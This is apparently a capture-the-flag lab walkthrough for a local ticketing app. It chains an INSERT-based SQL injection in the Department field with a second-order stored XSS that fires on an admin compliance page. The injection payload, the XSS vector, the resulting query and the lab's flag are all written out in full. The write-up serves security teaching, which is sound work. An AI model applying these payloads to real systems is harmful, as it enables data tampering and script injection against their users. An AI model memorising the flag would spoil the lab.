# Scenario 16: Chained Exploit — INSERT SQLi to Second-Order Stored XSS

- **Port:** `8016`
- **Category:** Exploit Chaining (SQL Injection + Second-Order Stored XSS)
- **Difficulty:** Expert
- **Flag:** `CTF{1ns3rt_sqli_t0_st0r3d_xss_ch41n}`
- **Target URL:** `http://localhost:8016/tickets`

---

## Lab Description
This lab contains a multi-stage chained vulnerability in an enterprise security dispatch portal. The ticket submission form is vulnerable to an `INSERT`-based SQL injection, and the internal executive compliance queue is vulnerable to Second-Order Stored Cross-Site Scripting (Stored XSS).

Standard user tickets are assigned low priority and excluded from the executive compliance queue. To solve this lab:
1. Exploit the `INSERT` SQL injection to inject across database columns, forcing your ticket priority to `'CRITICAL'` (or `is_trusted = 1`).
2. Inject a Second-Order Stored XSS payload into the ticket description column via the SQL injection.
3. Access the **Admin Compliance Queue** (`/admin/compliance`) to trigger `alert("cszone")` and capture the flag.

---

## Exploitation Walkthrough (PortSwigger Academy Methodology)

### 1. Functional Black-Box Testing & SQLi Recon
1. Navigate to `http://localhost:8016/tickets`.
2. Submit a normal ticket with:
   - **Submitter:** `Pentester`
   - **Department:** `SEC-OPS`
   - **Description:** `Firewall port audit.`
3. Observe that the ticket is created with `LOW` priority.
4. Next, test for SQL injection by placing a single quote (`'`) in the **Department Code** field:
   - **Department:** `SEC'`
5. Observe the database error response:
   ```text
   Database Query Error: near "'LOW', 0)": syntax error
   ```
6. This error reveals the internal `INSERT` structure:
   ```sql
   INSERT INTO support_tickets (submitter, department, issue_desc, priority, is_trusted) 
   VALUES ('$submitter', '$department', '$issue_desc', 'LOW', 0)
   ```

### 2. Constructing the INSERT-based SQLi & XSS Payload
To break out of the single column and inject custom values for `issue_desc`, `priority`, and `is_trusted`, craft an injection string in the **Department** field:

* **Department Payload:**
  ```sql
  SEC', '<img src=x onerror=alert("cszone")>', 'CRITICAL', 1) --
  ```

When inserted, the server constructs the following SQL query:
```sql
INSERT INTO support_tickets (submitter, department, issue_desc, priority, is_trusted) 
VALUES ('Pentester', 'SEC', '<img src=x onerror=alert("cszone")>', 'CRITICAL', 1) --', 'desc', 'LOW', 0)
```
The `--` comment discards the remainder of the query, successfully inserting a high-priority ticket with an embedded XSS vector into the database.

### 3. Submitting the Chained Vector
1. On the ticket submission form (`http://localhost:8016/tickets`):
   - **Submitter:** `Auditor`
   - **Department Code:** `SEC', '<img src=x onerror=alert("cszone")>', 'CRITICAL', 1) --`
   - **Issue Description:** `Audit pass`
2. Click **Submit Support Ticket**.
3. The response confirms: `✓ Support ticket submitted successfully and queued for priority triage.`

### 4. Executing the Second-Order Stored XSS & Flag Capture
1. Navigate to the executive compliance queue:
   ```text
   http://localhost:8016/admin/compliance
   ```
2. The compliance dashboard queries all tickets where `priority = 'CRITICAL'` or `is_trusted = 1`.
3. The browser renders the SQL-injected description unescaped, triggering `alert("cszone")`.
4. The lab status updates to **SOLVED 🎉** and the CTF flag is displayed in the Admin Vault card:
   ```text
   CTF{1ns3rt_sqli_t0_st0r3d_xss_ch41n}
   ```
